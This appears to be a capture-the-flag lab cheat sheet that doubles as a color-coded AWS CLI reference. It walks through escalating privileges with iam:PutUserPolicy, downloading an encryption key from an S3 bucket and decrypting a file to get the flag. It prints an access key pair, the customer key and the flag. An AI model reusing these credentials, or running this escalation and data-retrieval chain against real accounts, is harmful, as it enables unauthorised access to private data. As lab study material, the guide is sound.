# AWS CLI SIMPLE EXPLANATIONS WITH COLOR-CODED IMPORTANT LINES!

## 🎨 COLOR CODE KEY:
- 🔴 **RED** = CRITICAL/VERY IMPORTANT
- 🟠 **ORANGE** = IMPORTANT ACTIONS
- 🟡 **YELLOW** = INFORMATION TO LOOK FOR
- 🟢 **GREEN** = SUCCESS/GOOD OUTPUT
- 🔵 **BLUE** = COMMANDS YOU TYPE

---

# PART 1: WHY USE AWS CLI?

## 📌 SIMPLE EXPLANATION:
AWS CLI lets you control AWS from command line instead of clicking in web console. It's faster, scriptable, and shows exactly what's happening!

---

# PART 2: CONFIGURATION COMMANDS

## 🔵 `aws configure`
**WHY:** Tell AWS who you are (like showing your ID card)

```
🔴 AWS Access Key ID [None]: AKIAQ3EGUZME3BAXFV7D
🔴 AWS Secret Access Key [None]: 2ETmQExURN6kBI0/2kClgcuTLyVBD5idkrJSFvsY
🔴 Default region name [None]: us-east-1
🔴 Default output format [None]: json
```

## 🔵 `aws sts get-caller-identity`
**WHY:** Check if login worked - shows who you're logged in as

```json
{
    "UserId": "AIDAQ3EGUZME24ILVB44T",
    "Account": "058264439561",
    🟡 "Arn": "arn:aws:iam::058264439561:user/BackupReader1"  <-- YOUR USERNAME!
}
```

---

# PART 3: IAM COMMANDS (Permissions)

## 🔵 `aws iam get-user --query "User.PermissionsBoundary" --output text`
**WHY:** Find out what restrictions you have

```
🟡 arn:aws:iam::058264439561:policy/PermissionBoundaryPolicy  <-- YOUR RESTRICTIONS
```

## 🔵 `aws iam get-policy-version --policy-arn arn:aws:iam::058264439561:policy/PermissionBoundaryPolicy --version-id v3`
**WHY:** SEE EXACTLY WHAT YOU CAN DO! (Most important command!)

```json
{
    "PolicyVersion": {
        "Document": {
            "Statement": [
                {
                    "Action": [
                        🟡 "s3:ListBucket",      <-- Can list S3 buckets
                        🟡 "s3:GetObject"         <-- Can download files
                    ],
                    "Effect": "Allow",
                    "Resource": [
                        🟡 "arn:aws:s3:::securecopbakupbuk1",  <-- THIS bucket
                        "arn:aws:s3:::securecopbakupbuk1/*"
                    ]
                },
                {
                    "Action": [
                        🟡 "kms:Decrypt"          <-- Can decrypt with KMS!
                    ],
                    "Effect": "Allow",
                    "Resource": 🟡 "arn:aws:kms:us-east-1:058264439561:key/a7a251b3-c889-4dd1-9176-931c207c33d5"
                },
                {
                    "Action": [
                        🔴 "iam:PutUserPolicy"    <-- CAN ATTACH POLICIES TO YOURSELF! (EXPLOIT!)
                    ],
                    "Effect": "Allow",
                    "Resource": 🔴 "arn:aws:iam::058264439561:user/BackupReader1"
                }
            ]
        }
    }
}
```

## 🔵 `aws iam put-user-policy --user-name BackupReader1 --policy-name KMSFullAccessPolicy --policy-document file://policy.json`
**WHY:** 🔴 **PRIVILEGE ESCALATION!** Giving yourself more permissions

```
🟢 (No output = SUCCESS! You now have more power!)
```

---

# PART 4: S3 COMMANDS (Storage)

## 🔵 `aws s3 ls s3://securecopbakupbuk1/`
**WHY:** See what files are in the bucket

```
                           PRE .BurpSuite/
2024-09-24 16:49:10        411 🟡 Hospital+Patient+Records.zip  <-- Important file!
2024-09-24 16:48:40        411 🟡 env.txt                       <-- Important file!
2024-09-24 16:43:42        113 🟡 key.txt                       <-- 🔴 GET THIS FIRST!
```

## 🔵 `aws s3 cp s3://securecopbakupbuk1/key.txt .`
**WHY:** Download the key file (contains encryption key)

```
🟢 download: s3://securecopbakupbuk1/key.txt to .\key.txt
```

## 🔵 `type key.txt`
**WHY:** Look inside key.txt to find the encryption key

```
🟡 CustomerKey: ZhL8Zvaa3Xybf/sizoGwtrgKpxkxE46JJMiz1syVGQM=  <-- 🔴 ENCRYPTION KEY!
🟡 CustomerKeyMD5: ESUzbd203tahLpxvA6LL4g==                    <-- 🔴 KEY MD5 HASH!
```

## 🔵 `aws s3api get-object --bucket securecopbakupbuk1 --key env.txt ./env9.txt --sse-customer-algorithm AES256 --sse-customer-key ZhL8Zvaa3Xybf/sizoGwtrgKpxkxE46JJMiz1syVGQM= --sse-customer-key-md5 ESUzbd203tahLpxvA6LL4g==`
**WHY:** Download and DECRYPT env.txt using the key!

```json
{
    "AcceptRanges": "bytes",
    "LastModified": "2024-09-24T11:18:40+00:00",
    "ContentLength": 411,
    "ContentType": "binary/octet-stream",
    🟢 "SSECustomerAlgorithm": "AES256",              <-- SUCCESS! Decrypted!
    🟢 "SSECustomerKeyMD5": "ESUzbd203tahLpxvA6LL4g=="
}
```

## 🔵 `type env9.txt`
**WHY:** 🏁 GET THE FLAG!

```
🟡 CWL{AWS_KMS_Key_chal!enge_Suc(es$}  <-- 🔴🏆🏁 THE FLAG! 🏁🏆🔴
```

---

# PART 5: EC2 COMMANDS (Virtual Machines)

## 🔵 `aws ec2 describe-instances`
**WHY:** See all your virtual machines

```json
{
    "Reservations": [
        {
            "Instances": [
                {
                    🟡 "InstanceId": "i-1234567890abcdef0",  <-- VM ID
                    🟡 "InstanceType": "t2.micro",           <-- VM size
                    🟡 "State": {"Name": "running"},          <-- Is it on?
                    🟡 "PublicIpAddress": "54.123.45.67"      <-- How to connect
                }
            ]
        }
    ]
}
```

## 🔵 `aws ec2 start-instances --instance-ids i-1234567890abcdef0`
**WHY:** Turn ON a stopped VM

```json
{
    "StartingInstances": [
        {
            "InstanceId": "i-1234567890abcdef0",
            "CurrentState": {🟡 "Name": "starting"},
            "PreviousState": {🟡 "Name": "stopped"}
        }
    ]
}
```

## 🔵 `aws ec2 stop-instances --instance-ids i-1234567890abcdef0`
**WHY:** Turn OFF a running VM (save money)

```json
{
    "StoppingInstances": [
        {
            "InstanceId": "i-1234567890abcdef0",
            "CurrentState": {🟡 "Name": "stopping"},
            "PreviousState": {🟡 "Name": "running"}
        }
    ]
}
```

## 🔵 `aws ec2 terminate-instances --instance-ids i-1234567890abcdef0`
**WHY:** 🔴 DELETE a VM permanently (can't undo!)

```json
{
    "TerminatingInstances": [
        {
            "InstanceId": "i-1234567890abcdef0",
            "CurrentState": {🟡 "Name": "shutting-down"},
            "PreviousState": {🟡 "Name": "running"}
        }
    ]
}
```

---

# PART 6: SECURITY GROUP COMMANDS (Firewall)

## 🔵 `aws ec2 create-security-group --group-name my-firewall --description "My rules"`
**WHY:** Create a firewall for your VMs

```json
{
    🟡 "GroupId": "sg-1234567890abcdef0"  <-- Save this ID!
}
```

## 🔵 `aws ec2 authorize-security-group-ingress --group-id sg-1234567890abcdef0 --protocol tcp --port 22 --cidr 0.0.0.0/0`
**WHY:** 🔴 Allow SSH access from ANYWHERE (dangerous but sometimes needed)

```json
{
    "Return": true,
    "SecurityGroupRules": [
        {
            🟡 "CidrIpv4": "0.0.0.0/0",     <-- Anyone on internet
            🟡 "FromPort": 22,               <-- SSH port
            🟡 "ToPort": 22,                 <-- SSH port
            🟡 "IpProtocol": "tcp"            <-- TCP protocol
        }
    ]
}
```

## 🔵 `aws ec2 authorize-security-group-ingress --group-id sg-1234567890abcdef0 --protocol tcp --port 80 --cidr 0.0.0.0/0`
**WHY:** Allow web traffic (HTTP) from anywhere

---

# PART 7: KEY PAIR COMMANDS (SSH Access)

## 🔵 `aws ec2 create-key-pair --key-name my-key --query 'KeyMaterial' --output text > my-key.pem`
**WHY:** 🔴 Create SSH key to connect to VMs (SAVE THIS FILE!)

```
🟢 (Private key saved to my-key.pem)
```

## 🔵 `aws ec2 describe-key-pairs`
**WHY:** List all your SSH keys

```json
{
    "KeyPairs": [
        {🟡 "KeyName": "my-key"}  <-- Your keys
    ]
}
```

---

# PART 8: EBS VOLUME COMMANDS (Storage Disks)

## 🔵 `aws ec2 create-volume --availability-zone us-east-1a --size 10 --volume-type gp2`
**WHY:** Create a 10GB disk to attach to VM

```json
{
    🟡 "VolumeId": "vol-1234567890abcdef0",  <-- Disk ID
    🟡 "Size": 10,                            <-- 10GB
    🟡 "State": "creating"
}
```

## 🔵 `aws ec2 attach-volume --volume-id vol-1234567890abcdef0 --instance-id i-1234567890abcdef1 --device /dev/sdf`
**WHY:** Attach disk to your VM

```json
{
    "VolumeId": "vol-1234567890abcdef0",
    "InstanceId": "i-1234567890abcdef1",
    🟡 "State": "attaching"  <-- Connecting...
}
```

## 🔵 `aws ec2 create-snapshot --volume-id vol-1234567890abcdef0 --description "Backup"`
**WHY:** 🔴 BACKUP your disk! (Save before making changes)

```json
{
    🟡 "SnapshotId": "snap-1234567890abcdef0",
    "State": "pending",
    🟡 "Description": "Backup"
}
```

---

# PART 9: S3 API COMMANDS (Advanced Storage)

## 🔵 `aws s3api list-buckets`
**WHY:** See all buckets with more details

```json
{
    "Buckets": [
        {🟡 "Name": "securecopbakupbuk1", "CreationDate": "2024-09-24"}
    ]
}
```

## 🔵 `aws s3api put-bucket-policy --bucket securecopbakupbuk1 --policy file://policy.json`
**WHY:** Set permissions on who can access bucket

```
🟢 (No output = Policy applied!)
```

## 🔵 `aws s3api get-bucket-versioning --bucket securecopbakupbuk1`
**WHY:** Check if bucket keeps old versions of files

```json
{
    🟡 "Status": "Enabled"  <-- Keeps deleted file versions!
}
```

---

# PART 10: KMS COMMANDS (Encryption Keys)

## 🔵 `aws kms list-keys`
**WHY:** See all encryption keys

```json
{
    "Keys": [
        {🟡 "KeyId": "a7a251b3-c889-4dd1-9176-931c207c33d5"}
    ]
}
```

## 🔵 `aws kms describe-key --key-id a7a251b3-c889-4dd1-9176-931c207c33d5`
**WHY:** Get details about a specific key

```json
{
    "KeyMetadata": {
        🟡 "KeyId": "a7a251b3-c889-4dd1-9176-931c207c33d5",
        🟡 "Enabled": true,           <-- Key is active
        🟡 "KeyState": "Enabled",
        🟡 "Description": "Key for S3 encryption"
    }
}
```

## 🔵 `aws kms disable-key --key-id a7a251b3-c889-4dd1-9176-931c207c33d5`
**WHY:** 🔴 TURN OFF encryption key (breaks everything using it!)

```
🟢 (No output = Key disabled!)
```

---

# PART 11: LAMBDA COMMANDS (Serverless Code)

## 🔵 `aws lambda list-functions`
**WHY:** See all your serverless functions

```json
{
    "Functions": [
        {
            🟡 "FunctionName": "my-function",
            🟡 "Runtime": "nodejs18.x",
            🟡 "LastModified": "2025-02-20"
        }
    ]
}
```

## 🔵 `aws lambda invoke --function-name my-function output.txt`
**WHY:** Run a serverless function

```json
{
    🟢 "StatusCode": 200  <-- Success!
}
```

---

# PART 12: DYNAMODB COMMANDS (NoSQL Database)

## 🔵 `aws dynamodb list-tables`
**WHY:** See all your NoSQL tables

```json
{
    🟡 "TableNames": ["Users", "Orders"]  <-- Your tables
}
```

## 🔵 `aws dynamodb scan --table-name Users`
**WHY:** 🔴 Get ALL data from a table (expensive!)

```json
{
    "Items": [
        {
            "UserId": {🟡 "S": "user123"},
            "Name": {🟡 "S": "John Doe"},
            "Email": {🟡 "S": "john@example.com"}
        }
    ]
}
```

## 🔵 `aws dynamodb get-item --table-name Users --key '{"UserId":{"S":"user123"}}'`
**WHY:** Get ONE specific user (cheaper than scan)

---

# PART 13: SQS COMMANDS (Message Queue)

## 🔵 `aws sqs create-queue --queue-name my-queue`
**WHY:** Create a message queue

```json
{
    🟡 "QueueUrl": "https://sqs.us-east-1.amazonaws.com/123456789012/my-queue"
}
```

## 🔵 `aws sqs send-message --queue-url https://sqs... --message-body "Hello"`
**WHY:** Send a message to queue

```json
{
    🟡 "MessageId": "12345678-1234-1234-1234-123456789012"
}
```

## 🔵 `aws sqs receive-message --queue-url https://sqs...`
**WHY:** Get messages from queue

```json
{
    "Messages": [
        {
            "MessageId": "12345678-1234-1234-1234-123456789012",
            🟡 "Body": "Hello"  <-- The message!
        }
    ]
}
```

---

# PART 14: SECRETS MANAGER COMMANDS (Passwords)

## 🔵 `aws secretsmanager list-secrets`
**WHY:** See all stored secrets

```json
{
    "SecretList": [
        {🟡 "Name": "database-password"}
    ]
}
```

## 🔵 `aws secretsmanager get-secret-value --secret-id database-password`
**WHY:** 🔴 GET THE ACTUAL SECRET!

```json
{
    "Name": "database-password",
    🟡 "SecretString": "{\"password\":\"SuperSecret123!\"}"  <-- 🔴 THE PASSWORD!
}
```

---

# PART 15: CLOUDWATCH COMMANDS (Monitoring)

## 🔵 `aws logs describe-log-groups`
**WHY:** See all log collections

```json
{
    "logGroups": [
        {🟡 "logGroupName": "/aws/lambda/my-function"}
    ]
}
```

## 🔵 `aws logs get-log-events --log-group-name /aws/lambda/my-function --log-stream-name "2025/03/10/[$LATEST]123456"`
**WHY:** Read actual log entries

```json
{
    "events": [
        {🟡 "message": "Error: Something broke!"}  <-- Debug info
    ]
}
```

---

# PART 16: OUTPUT FORMATTING TRICKS

## 🔵 `aws s3 ls --output table`
**WHY:** Make output human-readable

```
---------------------------------------
|              ListBuckets            |
+-------------------------------------+
|  my-bucket  |  2024-09-24 11:15:22 |
+-------------------------------------+
```

## 🔵 `aws ec2 describe-instances --query 'Reservations[].Instances[].InstanceId' --output text`
**WHY:** Get ONLY the instance IDs (for scripting)

```
i-1234567890abcdef0
i-0987654321fedcba0
```

---

# 📊 QUICK REFERENCE - WHY USE EACH COMMAND

| Command | WHY Use It | 🎨 COLOR |
|---------|------------|----------|
| `aws configure` | 🔴 **Setup AWS access** | CRITICAL |
| `aws sts get-caller-identity` | 🟡 **Verify who you are** | INFO |
| `aws iam get-policy-version` | 🔴 **See your permissions** | CRITICAL |
| `aws iam put-user-policy` | 🔴 **Escalate privileges** | EXPLOIT |
| `aws s3 ls` | 🟡 **See what files exist** | INFO |
| `aws s3 cp` | 🟠 **Download/Upload files** | ACTION |
| `aws s3api get-object` with key | 🔴 **Decrypt encrypted files** | EXPLOIT |
| `type file.txt` | 🏁 **GET THE FLAG!** | VICTORY |
| `aws ec2 describe-instances` | 🟡 **Check your VMs** | INFO |
| `aws ec2 start-instances` | 🟠 **Turn on VMs** | ACTION |
| `aws ec2 stop-instances` | 🟠 **Turn off VMs** | ACTION |
| `aws ec2 terminate-instances` | 🔴 **DELETE VMs!** | DANGER |
| `aws kms list-keys` | 🟡 **See encryption keys** | INFO |
| `aws kms disable-key` | 🔴 **BREAK encryption** | DANGER |
| `aws secretsmanager get-secret-value` | 🔴 **GET PASSWORDS!** | EXPLOIT |
| `aws dynamodb scan` | 🔴 **GET ALL DATA** | EXPLOIT |

---

# 🏁 SIMPLE EXPLANATION OF THE LAB ATTACK

## 🔴 STEP 1: Check permissions
```
aws iam get-policy-version
```
Found: You can attach policies to yourself! `iam:PutUserPolicy`

## 🔴 STEP 2: Escalate privileges
```
aws iam put-user-policy
```
Gave yourself full access to S3 and KMS

## 🟡 STEP 3: List bucket contents
```
aws s3 ls s3://securecopbakupbuk1/
```
Found: `key.txt`, `env.txt`, `Hospital+Patient+Records.zip`

## 🔴 STEP 4: Download key
```
aws s3 cp s3://securecopbakupbuk1/key.txt .
```
Got the encryption key!

## 🔴 STEP 5: Decrypt env.txt
```
aws s3api get-object --key env.txt --sse-customer-key [THE KEY]...
```
Used the key to decrypt the file

## 🏁 STEP 6: Get the flag!
```
type env9.txt
```
🏆 **CWL{AWS_KMS_Key_chal!enge_Suc(es$}** 🏆

---

# ✅ SIMPLE RULES:

1. 🟡 **`list` commands** = Just looking, safe
2. 🟠 **`get`/`describe` commands** = Reading data
3. 🔴 **`put`/`create`/`delete` commands** = Making changes (be careful!)
4. 🟢 **No output** = Usually means success!
5. 🏁 **`type`/`cat` on result files** = Get the flag!

---

**REMEMBER:** The colored lines in output are what matters most! The rest is just formatting.
